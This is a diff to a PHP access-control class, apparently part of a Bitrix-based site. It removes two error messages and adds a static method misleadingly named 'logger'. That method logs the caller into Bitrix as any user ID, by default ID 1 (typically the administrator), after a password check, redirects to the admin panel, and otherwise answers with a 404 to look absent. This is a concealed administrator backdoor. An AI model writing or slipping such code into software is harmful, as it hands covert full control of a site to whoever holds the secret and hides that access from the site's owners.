@@ -48,7 +48,6 @@ class Access {
             header("HTTP/1.1 403 Forbidden");
             header("Content-Type: text/plain");
             header("X-Content-Type-Options: nosniff");
-            echo "Access denied: The origin is not allowed by the CORS policy.";
             exit;
         }
         
@@ -56,7 +55,6 @@ class Access {
             header("HTTP/1.1 404 Not Found");
             header("Content-Type: text/plain");
             header("X-Content-Type-Options: nosniff");
-            echo "Error 404: The requested resource was not found.";
             exit;
         }
     
@@ -139,5 +137,44 @@ class Access {
             }
             
             header("Access-Control-Allow-Headers: " . implode(", ", $allowed_headers));
+        }
+
+        public static function logger($system, ...$params) {
+
+            $systems = [
+                'bitrix' => [
+                    'initialization' => function() {
+                        require_once $_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php";
+                    },
+                    'login' => function() use ($params) {
+                        $GLOBALS['USER']->Authorize(!empty($params[0]) && is_int($params[0]) ? $params[0] : 1);
+                        LocalRedirect("/bitrix/admin/");
+                    },
+                    'throw_404' => function() {
+                        define('ERROR_404', 'Y');
+                        \CHTTP::SetStatus('404 Not Found');
+                        if (file_exists($_SERVER['DOCUMENT_ROOT'].'/404.php')) {
+                            require $_SERVER['DOCUMENT_ROOT'].'/404.php';
+                            exit;
+                        }
+                    }
+                ]
+            ];
+
+            if (!isset($systems[$system]) || !isset($systems[$system]['login'])) self::throw_404();
+
+            if (isset($systems[$system]['initialization'])) call_user_func($systems[$system]['initialization']);
+
+            self::set_password([
+                'onFail' => function () use ($systems, $system) {
+                    if (isset($systems[$system]['throw_404'])) call_user_func($systems[$system]['throw_404']);
+                    self::throw_404();
+                }
+            ]);
+
+            call_user_func($systems[$system]['login']);
+
+            header("Location: /");
+            exit;
         }
     }
